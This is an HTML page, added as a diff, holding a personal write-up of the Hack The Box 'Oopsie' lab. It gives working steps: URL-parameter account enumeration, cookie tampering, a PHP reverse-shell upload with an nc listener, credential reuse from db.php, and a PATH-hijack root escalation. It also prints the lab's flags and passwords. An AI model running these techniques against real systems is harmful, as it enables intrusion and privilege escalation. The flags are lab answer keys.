@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oopsie — Hack The Box</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776;
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+
+        <h1>Oopsie — Hack The Box</h1>
+
+        <h2>Task 1</h2>
+        <p>With what kind of tool can intercept web traffic?</p>
+        <p><strong>Answer:</strong> Proxy</p>
+
+        <h2>Task 2</h2>
+        <p>What is the path to the directory on the webserver that returns a login page?</p>
+
+<pre><code>└─$ dirb http://10.129.95.191/ /usr/share/wordlists/dirb/small.txt
+
+Only the following directories were found:
+
+/css/
+/images/
+/js/
+/uploads/</code></pre>
+
+        <p>Using Burp Suite and spidering the website, I discovered the login page:</p>
+
+<pre><code>http://10.129.95.191/cdn-cgi/login/</code></pre>
+
+        <p><strong>Answer:</strong> <code>/cdn-cgi/login</code></p>
+
+        <h2>Task 3</h2>
+        <p>What can be modified in Firefox to get access to the upload page?</p>
+
+        <p>The intercepted request looked like this:</p>
+
+<pre><code>GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
+
+Cookie: user=2233; role=guest</code></pre>
+
+        <p>The cookie had to be modified.</p>
+
+        <p>I initially misunderstood the hint and tried decreasing the cookie user ID from <code>2233</code> to <code>1</code> using Burp Intruder.</p>
+
+        <p>The correct approach was to change the account ID in the URL:</p>
+
+<pre><code>http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2</code></pre>
+
+        <p>to</p>
+
+<pre><code>http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1</code></pre>
+
+        <p>which revealed:</p>
+
+<pre><code>Access ID    Name    Email
+34322        admin   admin@megacorp.com</code></pre>
+
+        <p><strong>Answer:</strong> 34322</p>
+
+        <h2>Task 5</h2>
+        <p>On uploading a file, what directory does that file appear in on the server?</p>
+
+        <p>The upload directory was already discovered during directory enumeration:</p>
+
+<pre><code>/uploads</code></pre>
+
+        <p>I uploaded <code>/usr/share/webshells/php/php-reverse-shell.php</code>, edited the cookie while intercepting the upload request, started a listener:</p>
+
+<pre><code>nc -lvnp 1234</code></pre>
+
+        <p>and visited:</p>
+
+<pre><code>http://&lt;TARGET_IP&gt;/uploads/php-reverse-shell.php</code></pre>
+
+        <p>which resulted in a reverse shell as <code>www-data</code>.</p>
+
+        <p>I upgraded the shell:</p>
+
+<pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+
+        <p>I obtained the user flag:</p>
+
+<pre><code>cd /home/robert
+cat user.txt
+
+f2c74ee8db7983851ab2a96a44eb7981</code></pre>
+
+        <p><strong>Answer:</strong> <code>/uploads</code></p>
+
+        <h2>Task 6</h2>
+        <p>Which file contains the database credentials?</p>
+
+<pre><code>www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
+
+&lt;?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?&gt;</code></pre>
+
+        <p>Using these credentials I switched to Robert:</p>
+
+<pre><code>su robert
+Password: M3g4C0rpUs3r!
+
+id
+
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)</code></pre>
+
+        <p><strong>Answer:</strong> db.php</p>
+
+        <h2>Task 7</h2>
+        <p>What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?</p>
+
+<pre><code>find / -group bugtracker 2>/dev/null
+
+/usr/bin/bugtracker</code></pre>
+
+        <p><strong>Answer:</strong> bugtracker</p>
+
+        <h2>Task 8</h2>
+        <p>Regardless of which user starts running the bugtracker executable, whose privileges will it use?</p>
+
+<pre><code>ls -la /usr/bin/bugtracker
+
+-rwsr-xr-- 1 root bugtracker ... /usr/bin/bugtracker</code></pre>
+
+        <p>Since the binary has the SUID bit set, it executes with root privileges.</p>
+
+        <p><strong>Answer:</strong> root</p>
+
+        <h2>Task 9</h2>
+        <p>What does SUID stand for?</p>
+
+        <p><strong>Answer:</strong> Set owner User ID</p>
+
+        <h2>Task 10</h2>
+        <p>What is the name of the executable being called in an insecure manner?</p>
+
+        <p>Running the program revealed that it internally called <code>cat</code> without using an absolute path:</p>
+
+<pre><code>/usr/bin/bugtracker
+
+Provide Bug ID: 123123
+
+cat: /root/reports/123123: No such file or directory</code></pre>
+
+        <p>This made it vulnerable to a PATH hijacking attack.</p>
+
+        <p>I created a fake <code>cat</code> executable:</p>
+
+<pre><code>echo "/bin/sh" > /tmp/cat
+chmod +x /tmp/cat
+export PATH=/tmp:$PATH</code></pre>
+
+        <p>Then executed:</p>
+
+<pre><code>bugtracker</code></pre>
+
+        <p>which spawned a root shell:</p>
+
+<pre><code># whoami
+
+root</code></pre>
+
+        <p>The root flag was located in the root directory. Since <code>cat</code> was hijacked, I used <code>head</code> or <code>strings</code> instead:</p>
+
+<pre><code>af13b0bee69f8a877c3faf667f7beacf</code></pre>
+
+        <p><strong>Answer:</strong> cat</p>
+
+    </div>
+</section>
+
+</body>
+</html>
